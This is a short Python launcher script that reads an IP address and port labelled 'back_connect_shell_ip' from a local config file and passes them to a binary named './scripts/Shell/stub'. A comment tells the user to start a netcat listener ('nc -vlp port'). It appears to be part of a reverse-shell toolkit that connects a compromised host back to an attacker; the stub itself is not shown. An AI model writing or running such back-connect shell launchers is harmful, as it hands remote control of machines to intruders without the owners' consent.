#!/usr/bin/python

import os
import configparser

# use "nc -vlp port" on target host

if __name__ == "__main__":
    config = configparser.ConfigParser()
    config.read('local_config.ini')

    ip = config.get('settings', 'back_connect_shell_ip')
    port = config.getint('settings', 'back_connect_shell_port')

    os.system(f"./scripts/Shell/stub {ip} {port}")
